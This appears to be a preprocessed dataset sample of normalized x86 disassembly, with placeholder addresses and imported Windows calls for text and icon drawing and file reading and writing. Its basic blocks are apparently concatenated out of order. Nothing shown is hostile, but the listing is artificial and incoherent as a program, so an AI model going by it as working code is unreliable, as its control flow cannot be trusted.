mov [ esp + 0xd0 ] 0xf
mov [ esp + 0xcc ] 0x0
mov [ esp + 0xbc ] 0x0
jmp r-xdata
mov eax [ esp + 0xbc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ rw-data ]
push r--data
push edx
mov ecx [ rw-data ]
push r--data
push ecx
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call [ SetFilePointer@IAT ]
push r--data
lea eax [ esp + 0x148 ]
push eax
mov [ esp + 0x58 ] ebx
call [ lstrcpyA@IAT ]
cmp [ esp + 0x48 ] 0x4
je r-xdata
add eax 0xfffffff4
cdq
and edx 0x3
add eax edx
sar eax 0x2
cmp ebp edi
mov [ esp + 0x2c ] eax
jne r-xdata
mov ebx [ esp + 0x1c ]
mov ecx [ rw-data ]
imul ebx ebx 0x1c
mov eax [ ebx + ecx + 0x18 ]
add ebx ecx
cmp eax 0x10
jb r-xdata
mov eax ebp
imul eax eax 0x70
mov ecx [ eax + esi + 0x18 ]
add eax esi
cmp ecx 0x10
jb r-xdata
mov [ esp + 0x5c ] edi
jmp r-xdata
cmp ebp edx
jl r-xdata
mov ecx [ rw-data ]
mov eax ebp
cdq
idiv ecx
test [ rw-data ] 0x1
mov [ esp + 0x48 ] eax
je r-xdata
mov [ esp + 0x7c ] edi
mov [ rw-data ] 0x1
call [ SetWindowTextA@IAT ]
mov ecx rw-data
mov [ esp + 0x154 ] ebx
call sub_4010c0
mov [ esp + 0x158 ] eax
mov [ esp + 0x15c ] ebx
mov [ esp + 0x160 ] ebx
mov [ esp + 0x164 ] ebx
mov [ esp + 0x168 ] ebx
mov eax [ rw-data ]
lea eax [ eax + eax * 2 ]
shl eax 0x2
cmp eax ebx
jle r-xdata
mov al [ esp + 0x27 ]
test al al
jne r-xdata
lea eax [ eax + eax * 2 ]
mov ecx [ eax * 4 + rw-data ]
cmp ecx edi
lea eax [ eax * 4 + rw-data ]
jne r-xdata
add ebx 0x4
mov ebx [ ebx + 0x4 ]
jmp r-xdata
add eax 0x4
mov [ esp + 0x5c ] eax
mov ecx [ eax + 0x4 ]
mov [ esp + 0x5c ] ecx
jmp r-xdata
mov [ esp + 0x18 ] edi
mov edx eax
imul edx ecx
mov eax ebp
sub eax edx
mov [ esp + 0x84 ] eax
jmp r-xdata
inc eax
imul eax ecx
sub eax ebp
dec eax
mov [ esp + 0x84 ] eax
jmp r-xdata
cmp [ esp + 0x48 ] 0x4
jne r-xdata
mov ebp [ rw-data ]
cmp ebp [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x154 ] ecx
mov ecx [ rw-data ]
add eax ecx
mov [ esp + 0x15c ] edx
mov edx [ rw-data ]
mov [ esp + 0x160 ] eax
mov eax [ rw-data ]
mov [ esp + 0x158 ] ebp
mov [ esp + 0x164 ] edx
mov [ esp + 0x168 ] eax
jmp r-xdata
add eax 0x4
mov eax [ esp + 0x2c ]
lea edx [ eax + eax * 2 ]
mov eax [ rw-data ]
cmp eax [ edx * 4 + rw-data ]
jne r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ rw-data ]
lea edx [ eax + eax * 2 ]
mov eax [ edx * 4 + rw-data ]
cmp ecx eax
mov [ esp + 0x10 ] eax
je r-xdata
mov ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov al [ esp + 0x27 ]
test al al
mov [ esp + 0x5c ] ebx
je r-xdata
lea edx [ esp + 0xb4 ]
push edx
push ebx
push 0x2
mov [ esp + 0xc0 ] esi
call sub_4232a0
mov ebp eax
add esp 0xc
test ebp ebp
mov [ esp + 0x18 ] ebp
jne r-xdata
lea ecx [ esp + 0xb4 ]
push ecx
push ebx
or esi 0xffffffff
push 0x1
mov [ esp + 0xc0 ] esi
call sub_4232a0
mov ebp eax
add esp 0xc
test ebp ebp
mov [ esp + 0x18 ] ebp
jne r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
push edx
mov [ esp + 0x84 ] edi
call sub_45b5d0
mov ecx eax
imul ecx ecx 0x12c
mov esi [ ecx + rw-data ]
mov ecx [ ecx + rw-data ]
add esp 0x4
cmp eax 0x4
mov [ esp + 0x4c ] esi
mov [ esp + 0x14 ] ecx
jne r-xdata
cmp eax 0xc
jl r-xdata
mov esi [ rw-data ]
cmp esi [ rw-data ]
je r-xdata
push 0x0
lea edx [ esp + 0x58 ]
push edx
push 0x4
lea eax [ esp + 0x5c ]
push eax
push edi
call [ WriteFile@IAT ]
push edi
call [ CloseHandle@IAT ]
mov esi [ esp + 0x78 ]
lea ebx [ ebp + 0x4 ]
mov ebx [ WriteFile@IAT ]
push 0x0
lea ecx [ esp + 0x58 ]
push ecx
push 0x28
lea edx [ esp + 0x150 ]
push edx
push edi
call ebx
mov eax [ esp + 0x54 ]
mov edx [ esp + 0x50 ]
add edx eax
mov eax [ rw-data ]
cmp eax 0x1d
mov [ esp + 0x50 ] edx
jne r-xdata
mov edx [ rw-data ]
mov ebp [ edx + 0x8 ]
cmp [ ebp + 0x34 ] 0x10
jb r-xdata
push sub_4480e0
push 0x20
push 0x1c
lea ecx [ esp + 0x98c ]
push ecx
mov [ esp + 0x1dbc ] 0x1
call sub_4b6814
jmp r-xdata
mov ebp [ esp + 0x1c ]
mov eax [ rw-data ]
imul ebp ebp 0x1c
add ebp eax
jmp r-xdata
mov [ rw-data ] ecx
mov eax [ ebp + 0x2ec ]
test eax eax
jne r-xdata
mov ecx rw-data
call sub_404310
push 0x1
push ebp
call sub_493140
add esp 0x8
jmp r-xdata
lea eax [ esp + 0xb4 ]
push eax
push ebx
push 0x3
mov [ esp + 0xc0 ] esi
call sub_4232a0
mov ebp eax
add esp 0xc
test ebp ebp
mov [ esp + 0x18 ] ebp
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov edx [ rw-data ]
mov eax ecx
mov ecx [ edx + eax * 4 ]
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esp + 0x18 ]
cmp ecx eax
jge r-xdata
mov ecx rw-data
call sub_4010f0
test eax eax
jbe r-xdata
add eax 0xfffffff4
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea esi [ eax + eax * 2 ]
lea eax [ esp + 0xd4 ]
shl esi 0x2
push eax
lea ecx [ esi + rw-data ]
call sub_4209f0
mov eax [ esi + rw-data ]
mov esi [ esp + 0xd4 ]
cmp esi eax
je r-xdata
mov esi [ rw-data ]
cmp esi [ rw-data ]
je r-xdata
nop
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov cl [ eax + rw-data ]
test cl cl
je r-xdata
lea ebx [ ebp + 0x20 ]
mov ebx [ ebp + 0x20 ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov eax [ rw-data ]
mov ecx [ eax + 0x8 ]
mov eax [ ecx + 0x34 ]
add ecx 0x1c
cmp eax 0x10
jb r-xdata
cmp [ ebp + 0x2f0 ] 0x10
jb r-xdata
mov eax esi
jmp r-xdata
push sub_4480e0
push 0x20
push 0x1c
lea eax [ esp + 0x98c ]
push eax
mov [ esp + 0x1dbc ] 0x1
call sub_4b6814
lea ebp [ esp + 0x980 ]
mov eax ebx
mov [ esp + 0x18 ] ebp
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
inc [ esp + 0x18 ]
xor edi edi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x158 ]
xor ebp ebp
test eax eax
jle r-xdata
mov ebp 0x10
lea ebx [ ebx ]
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov eax [ rw-data ]
mov ecx [ eax ]
mov [ esp + 0x18 ] ebp
mov [ rw-data ] ecx
or esi 0xffffffff
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x1db4 ]
mov edx [ ecx ]
push eax
push edx
call [ ReleaseDC@IAT ]
call [ GdiFlush@IAT ]
mov ecx rw-data
call sub_401420
mov al [ esp + 0x27 ]
test al al
je r-xdata
mov eax [ esp + 0x5c ]
test eax eax
je r-xdata
lea edi [ ecx + 0x4 ]
mov edi [ ecx + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x2dc ]
mov eax [ ebp + 0x2dc ]
jmp r-xdata
lea edi [ eax - 0x1 ]
test edi edi
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebx
lea ecx [ esp + 0x9a4 ]
call sub_401e80
lea ecx [ esp + 0x980 ]
push ecx
call sub_406420
add esp 0x4
jmp r-xdata
mov eax [ rw-data ]
mov ebx ebp
imul ebx ebx 0x70
cmp [ ebx + eax + 0x18 ] 0x10
mov [ esp + 0x10 ] ebx
jb r-xdata
mov edi ecx
mov ecx [ rw-data ]
shl edi 0x2
mov esi [ ecx + edi ]
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx esi
push edx
call sub_4440b0
mov esi eax
test esi esi
jg r-xdata
mov ecx [ esp + 0x18 ]
cmp ecx eax
jge r-xdata
mov ecx [ rw-data ]
cmp ecx edi
jne r-xdata
cmp ecx ebp
mov esi [ rw-data ]
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x10 ] edx
je r-xdata
xor ebx ebx
add eax 0x20
mov eax [ eax + 0x20 ]
jmp r-xdata
push 0x0
lea ecx [ esp + 0x58 ]
push ecx
push 0x10
push esi
push edi
call ebx
mov ebp [ esp + 0x50 ]
mov edx [ esp + 0x54 ]
mov eax [ rw-data ]
add ebp edx
add esi 0x10
cmp esi eax
mov [ esp + 0x50 ] ebp
jne r-xdata
jmp r-xdata
cmp [ esi + 0x18 ] 0x10
mov ecx [ esi + 0x14 ]
jb r-xdata
push 0x0
lea edx [ esp + 0x58 ]
push edx
inc ecx
push ecx
push eax
push edi
call ebx
mov eax [ esp + 0x54 ]
mov edx [ esp + 0x50 ]
add edx eax
mov eax [ rw-data ]
add esi 0x1c
cmp esi eax
mov [ esp + 0x50 ] edx
jne r-xdata
mov eax [ esp + 0x10 ]
test [ eax + rw-data ] 0x20
je r-xdata
jmp r-xdata
mov ecx [ rw-data ]
lea esi [ ecx + eax + 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ ebx ]
jmp r-xdata
mov ecx [ esp + 0x38 ]
call sub_43d760
push 0x1
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
call sub_4290f0
add esp 0x4
jmp r-xdata
mov ecx rw-data
call sub_404310
mov esi [ esp + 0x5c ]
push esi
call sub_457f90
mov ebp eax
add esp 0x4
add ebp esi
push ebp
call [ lstrlenA@IAT ]
mov edi [ rw-data ]
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x28 ]
lea esi [ edi + ecx ]
imul esi [ esp + 0x44 ]
mov [ esp + 0x4c ] eax
mov eax [ rw-data ]
lea ecx [ eax + edx ]
imul ecx [ esp + 0x3c ]
lea edx [ ecx + eax + 0x2 ]
mov ecx [ rw-data ]
lea eax [ esp + 0x16c ]
push eax
push 0x3
push r--data
xor ebx ebx
push ecx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x28 ] ebx
add esi 0x2
mov [ esp + 0x2c ] edx
add edi 0xfffffffc
mov [ esp + 0xec ] 0x2e2e2e
call [ GetTextExtentPoint32A@IAT ]
cmp [ rw-data ] 0x1d
jne r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
mov edx [ ebp + 0x14 ]
sub ecx esi
test edx edx
mov eax ecx
je r-xdata
mov ecx edi
lea esi [ ecx + 0x1 ]
xor eax eax
mov ecx 0xf
mov [ esp + 0x1a0 ] ecx
mov [ esp + 0x19c ] eax
mov [ esp + 0x18c ] al
mov [ esp + 0x1f4 ] ecx
mov [ esp + 0x1f0 ] eax
mov [ esp + 0x1e0 ] al
sub esp 0x1c
mov esi esp
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] ecx
mov [ esi + 0x4 ] al
mov eax ebx
mov [ esp + 0x1dc8 ] 0x4
mov [ esp + 0x2c ] esp
lea edx [ eax + 0x1 ]
nop
mov [ esp + 0x14 ] 0x0
push eax
call j_sub_4b692d
add esp 0x4
lea eax [ ebx + eax + 0x4 ]
mov eax [ ebx + eax + 0x4 ]
jmp r-xdata
mov ecx [ rw-data ]
mov ebx [ ecx + edi ]
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx ebx
push edx
call sub_444100
mov ecx eax
test ecx ecx
jg r-xdata
mov eax [ rw-data ]
mov esi [ eax + edi ]
call sub_40af00
push eax
push 0x0
mov ecx esi
call sub_4440b0
mov esi eax
mov edx [ rw-data ]
imul ecx ecx 0x70
mov eax ebp
imul eax eax 0x70
mov ebx [ eax + edx + 0x14 ]
add eax edx
add ecx edx
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov eax [ rw-data ]
cmp [ ebx + eax + 0x18 ] ecx
jb r-xdata
mov dl [ eax + rw-data ]
test dl dl
je r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x34 ] ebp
mov ecx [ eax + 0x30 ]
jb r-xdata
mov [ esp + 0xd4 ] esi
jmp r-xdata
push 0x0
lea edx [ esp + 0x58 ]
push edx
inc ecx
push ecx
push eax
push edi
call ebx
mov eax [ esp + 0x54 ]
mov edx [ esp + 0x50 ]
add edx eax
mov eax [ rw-data ]
add eax 0xfffffff4
mov [ esp + 0x50 ] edx
mov esi [ esi ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ecx [ eax + eax * 2 ]
cmp esi [ ecx * 4 + rw-data ]
jne r-xdata
push 0x0
lea edx [ esp + 0x58 ]
push edx
push esi
call [ lstrlenA@IAT ]
inc eax
push eax
push esi
push edi
call [ WriteFile@IAT ]
mov eax [ esp + 0x54 ]
mov esi [ esp + 0x50 ]
add esi eax
mov eax [ rw-data ]
add ebp 0x1c
add ebx 0x1c
cmp ebp eax
mov [ esp + 0x50 ] esi
jne r-xdata
mov [ esp + 0x14 ] 0x0
lea ecx [ ecx ]
add esi 0x10
sub edi 0x10
cmp edx eax
jb r-xdata
cmp edx eax
mov ecx edx
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebx
mov ecx esi
call sub_401e80
call sub_405090
add esp 0x1c
cmp eax 0x1
jne r-xdata
mov esi [ esp + 0x1c ]
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
cmp ecx edx
jbe r-xdata
push eax
call sub_439280
xor edx edx
mov ebp eax
mov edi 0xf
add esp 0x4
mov [ esp + 0x78 ] ebp
mov [ esp + 0xac ] edi
mov [ esp + 0xa8 ] edx
mov [ esp + 0x98 ] dl
mov eax [ rw-data ]
cmp eax edx
mov [ esp + 0x1dac ] 0x2
je r-xdata
mov ebx [ rw-data ]
mov ebp [ rw-data ]
mov edx ecx
mov eax esi
imul edx ebx
imul eax ebp
cmp eax edx
jle r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi ]
call sub_40af00
push eax
push 0x0
mov ecx ebx
call sub_444100
mov ecx eax
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebx + eax + 0x4 ]
mov eax [ ebx + eax + 0x4 ]
jmp r-xdata
mov eax [ rw-data ]
cmp [ ebx + eax + 0x18 ] ecx
jb r-xdata
mov edx [ esp + 0x78 ]
mov ecx [ esp + 0x4c ]
add ebx eax
mov eax [ esp + 0x14 ]
add eax edx
cmp eax ecx
mov [ esp + 0x14 ] eax
jl r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ rw-data ]
inc ecx
cmp ecx edx
mov [ esp + 0x10 ] ecx
jge r-xdata
mov ecx [ rw-data ]
mov eax [ ecx ]
cmp eax [ esp + 0x10 ]
mov [ rw-data ] eax
jne r-xdata
xor ebx ebx
cmp edx eax
setne bl
test ebx ebx
je r-xdata
cmp [ ebp + 0x18 ] 0x10
jb r-xdata
mov ecx eax
cmp eax 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x40 ]
cmp ecx 0x1
jne r-xdata
push edx
lea edx [ esp + 0xdc ]
push edx
lea ecx [ esp + 0x90 ]
push ecx
push eax
call sub_4af910
mov eax [ esp + 0xe8 ]
add esp 0x10
test eax eax
je r-xdata
mov esi [ esp + 0x1c ]
cmp [ eax + esi * 4 ] edx
je r-xdata
mov eax esi
imul eax ebp
cdq
idiv ecx
mov [ esp + 0x14 ] 0x0
mov ebx eax
mov eax [ rw-data ]
sub eax ebx
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x20 ] eax
mov eax ecx
imul eax ebx
cdq
idiv esi
mov [ esp + 0x20 ] 0x0
mov ebp eax
mov eax [ rw-data ]
sub eax ebp
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x14 ] eax
jmp r-xdata
cmp edx ebx
jb r-xdata
cmp edx ebx
mov edi edx
jb r-xdata
mov edx [ ecx + 0x14 ]
test edx edx
je r-xdata
mov eax [ esp + 0x10 ]
test [ eax + rw-data ] 0x20
mov ecx 0x10
je r-xdata
mov edx [ rw-data ]
lea esi [ edx + eax + 0x1 ]
lea esi [ ebx + eax + 0x4 ]
jmp r-xdata
mov esi [ ebx + eax + 0x4 ]
jmp r-xdata
mov edx [ esp + 0x14 ]
lea eax [ edx + ebp ]
xor ecx ecx
mov cl [ eax ]
xor cl 0x20
add cl 0x5f
mov dl 0x3b
cmp dl cl
lea edx [ esp + 0xe4 ]
push edx
sbb ecx ecx
add ecx 0x2
push ecx
push eax
mov eax [ rw-data ]
push eax
mov [ esp + 0x88 ] ecx
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0xe4 ]
lea ecx [ eax + ebx ]
cmp ecx edi
jle r-xdata
cmp [ rw-data ] 0x1d
jne r-xdata
mov edx [ esp + 0x16c ]
mov ecx [ esp + 0x40 ]
add edx eax
cmp edx edi
mov [ esp + 0x2c ] ecx
mov [ esp + 0x4c ] 0x0
jg r-xdata
mov ecx [ esp + 0x1c ]
mov eax edi
sub eax ebx
cdq
sub eax edx
mov edx [ esp + 0x14 ]
sar eax 0x1
lea ebx [ eax + esi ]
mov eax [ esp + 0x40 ]
sub edx eax
push edx
add eax ebp
push eax
mov eax [ esp + 0x20 ]
lea eax [ eax + eax * 2 ]
lea edx [ ecx + eax * 4 ]
mov eax [ rw-data ]
push edx
push ebx
push eax
call [ TextOutA@IAT ]
cmp [ rw-data ] 0x1d
jne r-xdata
lea esi [ ebp + 0x4 ]
mov esi [ ebp + 0x4 ]
jmp r-xdata
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x194 ]
push ecx
push 0x0
lea edx [ esp + 0x94 ]
push edx
push edi
push ebx
call sub_409a30
add esp 0x20
test eax eax
jl r-xdata
test edi edi
jge r-xdata
push ebx
call sub_405ce0
add esp 0x4
cmp eax 0x1
jne r-xdata
cmp ecx 0x2
jne r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov eax [ esp + 0x88 ]
test eax eax
je r-xdata
xor esi esi
push esi
push esi
push 0x3
push esi
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
cmp eax edx
lea eax [ ebx + ecx ]
je r-xdata
mov ecx [ rw-data ]
mov ebx [ esp + 0x14 ]
push ecx
mov ecx [ rw-data ]
push ecx
mov ecx [ rw-data ]
push edx
shl ecx 0x10
or ecx ebx
push ecx
push edx
mov edx [ eax + esi * 4 ]
push ebp
push edx
push esi
jmp r-xdata
mov eax [ esp + 0x1c ]
cmp [ rw-data ] eax
jne r-xdata
cmp edi [ esp + 0x90 ]
jge r-xdata
mov ecx rw-data
mov [ esp + 0x18 ] ebp
mov [ esp + 0x40 ] ebx
call sub_404310
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov edi [ ecx + edi ]
push 0x0
push 0x0
push 0x0
call sub_40af00
mov ecx [ rw-data ]
push eax
mov eax [ esp + 0x5c ]
xor edx edx
mov dl [ rw-data ]
push edx
mov edx [ esp + 0x3c ]
push eax
mov eax [ rw-data ]
add ecx edx
imul ecx [ esp + 0x54 ]
mov edx [ esp + 0x2c ]
push ebp
push ebx
push 0x0
push 0x0
push ebp
add ecx edx
mov edx [ esp + 0x4c ]
push ebx
push ecx
mov ecx [ esp + 0x64 ]
add eax ecx
imul eax [ esp + 0x78 ]
add eax edx
push eax
push esi
mov ecx edi
call sub_4421e0
call [ GdiFlush@IAT ]
fild [ rw-data ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov esi [ esp + 0x78 ]
mov edx [ rw-data ]
sub esi eax
mov eax [ esp + 0x34 ]
add edx eax
imul edx [ esp + 0x88 ]
mov [ esp + 0x14 ] edx
fild [ esp + 0x14 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ rw-data ]
add esi eax
mov [ esp + 0x68 ] esi
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ rw-data ]
mov edx [ esp + 0x2c ]
mov edi [ esp + 0x80 ]
add ecx edx
imul ecx [ esp + 0x4c ]
mov [ esp + 0x14 ] ecx
sub edi eax
fild [ esp + 0x14 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x64 ]
add edi eax
mov eax [ esp + 0xb4 ]
add esp 0x4
add eax esi
mov [ esp + 0x68 ] edi
mov [ esp + 0x6c ] eax
lea edx [ edi + ecx ]
cmp esi [ esp + 0x8c ]
mov [ esp + 0x70 ] edx
jge r-xdata
xor eax eax
cmp edx ebx
setne al
test eax eax
jmp r-xdata
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
mov edi ebx
push 0x0
lea eax [ esp + 0x58 ]
push eax
push esi
call [ lstrlenA@IAT ]
inc eax
push eax
push esi
push edi
call [ WriteFile@IAT ]
mov esi [ esp + 0x50 ]
mov ecx [ esp + 0x54 ]
mov eax [ esp + 0x158 ]
add esi ecx
inc ebp
add ebx 0x70
cmp ebp eax
mov [ esp + 0x50 ] esi
jl r-xdata
mov ecx [ esp + 0x40 ]
mov eax [ esp + 0x14 ]
sub eax ecx
push eax
mov eax [ esp + 0x1c ]
lea edx [ eax + eax * 2 ]
mov eax [ esp + 0x20 ]
add ecx ebp
push ecx
lea ecx [ eax + edx * 4 ]
mov eax edi
sub eax ebx
cdq
sub eax edx
mov edx [ rw-data ]
sar eax 0x1
push ecx
add eax esi
push eax
push edx
call [ TextOutA@IAT ]
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1d
mov edi [ esp + 0x18 ]
jne r-xdata
lea esp [ esp ]
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0xe4 ]
mov [ esp + 0x40 ] edx
xor ebx ebx
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
test ebx ebx
jne r-xdata
sbb ebx ebx
sbb ebx 0xffffffff
xor ebx ebx
[ esi ] [ edi ]
je r-xdata
mov eax [ esp + 0x1a4 ]
push 0x110
push 0x160
lea edx [ esp + 0x6c8 ]
push edx
push eax
push ebx
call [ SHGetFileInfoA@IAT ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
cmp ecx esi
jle r-xdata
cmp [ esp + 0x1a0 ] 0x10
mov eax [ esp + 0x18c ]
jae r-xdata
push 0x0
lea ecx [ esp + 0x114 ]
push ecx
lea edx [ esp + 0x124 ]
push edx
lea eax [ esp + 0x148 ]
push eax
lea ecx [ esp + 0x114 ]
push ecx
lea edx [ esp + 0x1990 ]
push edx
lea eax [ esp + 0x118 ]
push eax
push edi
push 0x0
push 0x0
push ebx
call sub_406950
add esp 0x2c
test eax eax
jl r-xdata
xor edi edi
test edi edi
jge r-xdata
push edx
push edx
push edx
lea edx [ esp + 0x8c ]
push edx
push eax
call sub_4053a0
add esp 0x14
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov esi 0x10
cmp ecx esi
mov ecx [ rw-data ]
mov [ esp + 0x80 ] edx
jae r-xdata
mov ecx [ rw-data ]
mov esi 0x10
cmp ecx esi
mov ecx [ rw-data ]
mov [ esp + 0x80 ] edx
jae r-xdata
xor esi esi
mov edi [ rw-data ]
mov edx [ rw-data ]
push 0x0
push edx
mov edx [ rw-data ]
test edi edi
mov edi [ esp + 0x1c ]
setne cl
shl edx 0x10
or edx edi
push ecx
mov ecx [ esp + 0x44 ]
push edx
push 0x0
push ebp
push eax
push esi
call sub_4402e0
mov esi eax
jmp r-xdata
mov eax [ rw-data ]
lea ecx [ esp + 0xd8 ]
push ecx
lea edx [ esp + 0x8c ]
add ebx eax
push edx
push ebx
call sub_4adff0
add esp 0xc
test esi esi
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x18 ]
push edx
mov edx [ rw-data ]
test edx edx
mov edx [ esp + 0x90 ]
setne al
shl ecx 0x10
or ecx esi
push eax
mov eax [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x48 ]
push 0x0
push ebp
push edx
push eax
call sub_4402e0
push 0x0
push edi
mov esi eax
call [ GetFileSize@IAT ]
mov ebx eax
push ebx
push 0x0
call [ LocalAlloc@IAT ]
test eax eax
mov [ esp + 0x88 ] eax
je r-xdata
mov ecx [ esp + 0x58 ]
call sub_4402e0
test eax eax
cmp [ rw-data ] eax
jne r-xdata
mov esi [ esp + 0x70 ]
mov edi [ esp + 0x58 ]
mov edx [ esp + 0x34 ]
push 0x0
lea ecx [ esp + 0x68 ]
push ecx
add esi edi
push edx
mov [ esp + 0x7c ] esi
call sub_45d710
add esp 0xc
sub esi edi
jmp r-xdata
test eax eax
jle r-xdata
je r-xdata
lea esi [ ecx + 0x4 ]
mov esi [ ecx + 0x4 ]
jmp r-xdata
mov ecx rw-data
call sub_401420
cmp edi [ esp + 0x90 ]
jge r-xdata
mov ecx [ esp + 0x5c ]
push 0x110
push 0x160
lea eax [ esp + 0x828 ]
push eax
push ecx
call [ GetFileAttributesA@IAT ]
mov edx [ esp + 0x68 ]
push eax
push edx
call [ SHGetFileInfoA@IAT ]
mov eax [ esp + 0x820 ]
mov ecx [ esp + 0x1c ]
push 0x3
push 0x0
push 0x0
push 0xe
push 0xe
push eax
mov eax edi
sub eax ebx
cdq
sub eax edx
sar eax 0x1
add ecx 0xfffffffe
push ecx
lea edx [ eax + esi - 0x11 ]
mov eax [ rw-data ]
push edx
push eax
call [ DrawIconEx@IAT ]
mov ecx [ esp + 0x820 ]
push ecx
call [ DestroyIcon@IAT ]
mov ecx [ esp + 0x1c ]
mov edx [ rw-data ]
mov ebx [ TextOutA@IAT ]
lea eax [ edi + edi * 2 ]
lea edi [ ecx + eax * 4 ]
mov ecx [ esp + 0x40 ]
mov eax [ esp + 0x2c ]
sub eax ecx
push eax
add ecx ebp
push ecx
push edi
push esi
push edx
call ebx
mov ecx [ esp + 0x4c ]
mov edx [ rw-data ]
push 0x3
lea eax [ esp + 0xe0 ]
push eax
push edi
add ecx esi
push ecx
push edx
call ebx
jmp r-xdata
test edi edi
jne r-xdata
mov eax [ esp + 0x2c ]
mov cl [ eax + ebp ]
add eax ebp
xor cl 0x20
add cl 0x5f
mov dl 0x3b
cmp dl cl
mov edx [ rw-data ]
sbb ebx ebx
lea ecx [ esp + 0xe4 ]
push ecx
add ebx 0x2
push ebx
push eax
push edx
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x16c ]
add eax ebx
mov [ esp + 0x2c ] eax
mov eax [ esp + 0xe4 ]
add ecx eax
add edx ecx
add edx eax
cmp edx edi
mov [ esp + 0x4c ] ecx
jle r-xdata
mov edx [ esp + 0x5c ]
push 0x110
push 0x160
lea ecx [ esp + 0x408 ]
push ecx
push edx
call [ GetFileAttributesA@IAT ]
push eax
mov eax [ esp + 0x6c ]
push eax
call [ SHGetFileInfoA@IAT ]
mov ecx [ esp + 0x400 ]
mov edx [ esp + 0x1c ]
mov eax [ rw-data ]
push 0x3
push 0x0
push 0x0
push 0xe
push 0xe
push ecx
add edx 0xfffffffe
push edx
add ebx 0xffffffef
push ebx
push eax
call [ DrawIconEx@IAT ]
mov ecx [ esp + 0x400 ]
push ecx
call [ DestroyIcon@IAT ]
sub esi 0x10
add edi 0x10
mov eax ecx
cdq
sub eax edx
mov ebp eax
sar ebp 0x1
cmp ebp 0x20
mov [ esp + 0x2c ] ebp
jge r-xdata
mov eax esi
cdq
sub eax edx
mov ebp eax
sar ebp 0x1
cmp ebp 0x20
mov [ esp + 0x2c ] ebp
jge r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov esi [ esp + 0x14 ]
push ecx
mov ecx [ rw-data ]
push edx
shl ecx 0x10
push 0x0
or ecx esi
push ecx
push 0x1
push eax
call sub_439280
mov edx [ esp + 0x98 ]
mov ecx [ esp + 0x50 ]
add esp 0x4
push eax
push edx
push 0x0
call sub_4402e0
lea eax [ esp + 0x18c ]
mov ecx [ esp + 0x11c ]
mov edx [ esp + 0x13c ]
mov eax [ esp + 0x104 ]
push 0x0
push ecx
push edx
mov edx [ esp + 0x11c ]
push eax
mov eax [ esp + 0x2c ]
sub esp 0x428
mov edi esp
mov ecx 0x10a
lea esi [ esp + 0x1db4 ]
[ edi ] [ esi ]
mov ecx [ esp + 0x538 ]
push ecx
